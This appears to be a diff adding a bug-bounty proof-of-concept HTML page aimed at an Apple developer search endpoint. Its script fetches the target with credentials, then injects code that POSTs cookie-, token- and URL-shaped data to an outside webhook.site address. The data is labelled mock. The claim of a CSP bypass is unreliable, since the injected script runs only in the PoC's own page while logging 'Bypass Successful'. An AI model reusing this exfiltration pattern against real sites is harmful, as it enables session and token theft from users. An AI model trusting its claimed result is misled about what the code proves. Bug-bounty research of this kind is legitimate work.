@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PoC - Client-Side Desync & CSP Bypass</title>
+</head>
+<body>
+<h2>PoC - Client-Side Desync & CSP Bypass</h2>
+<p>This test is designed exclusively for my own account within Apple's Security Bounty program. No real user data is being collected.</p>
+
+<script>
+/*
+📌 Purpose of this script:
+Demonstrate that it is possible to execute JavaScript in the affected scope 
+due to a Client-Side Desync vulnerability, which could allow session data access.
+In this PoC, only MOCK (fake) data is sent to avoid unauthorized access.
+
+🔍 Data fields:
+- cookies: Represents browser cookies (mocked here).
+- localStorage: Represents localStorage content (mocked here).
+- page: Current page URL (real).
+- note: A clear disclaimer that the data is fake and only for demonstration.
+
+This proves the ability to bypass CSP and execute JavaScript, 
+without compromising any real accounts or user privacy.
+*/
+
+// Target vulnerable endpoint
+const targetUrl = "https://developer.apple.com/search/services/v1/quick-links/";
+
+// Your webhook for receiving PoC results
+const webhookUrl = "https://webhook.site/6779eec5-8f34-4065-80c4-b471fe8c032b";
+
+// Fake data simulating what real sensitive data might look like
+const fakeData = {
+    cookies: "sessionid=FAKE123456; user=demo",
+    localStorage: { token: "FAKE_TOKEN_123" },
+    page: location.href,
+    note: "This is MOCK data only. No real sensitive information is being collected."
+};
+
+// Simulated CSP bypass: Inject and run code inside target context
+function cspBypass() {
+    const script = document.createElement('script');
+    script.innerHTML = `
+        console.log("✅ CSP Bypass Successful - Code Executed in Target Context");
+        document.body.style.background = '#ffcccc';
+        document.body.insertAdjacentHTML('beforeend', '<h2>Injected Script Executed!</h2>');
+
+        // Send mock data to the webhook
+        fetch("${webhookUrl}", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(${JSON.stringify(fakeData)})
+        });
+    `;
+    document.body.appendChild(script);
+}
+
+// Simulate fetching the vulnerable page then injecting our code
+fetch(targetUrl, { credentials: "include" })
+    .then(response => response.text())
+    .then(html => {
+        console.log("📄 Vulnerable page fetched, injecting code...");
+        cspBypass();
+    })
+    .catch(err => console.error("❌ Error fetching target:", err));
+</script>
+
+</body>
+</html>
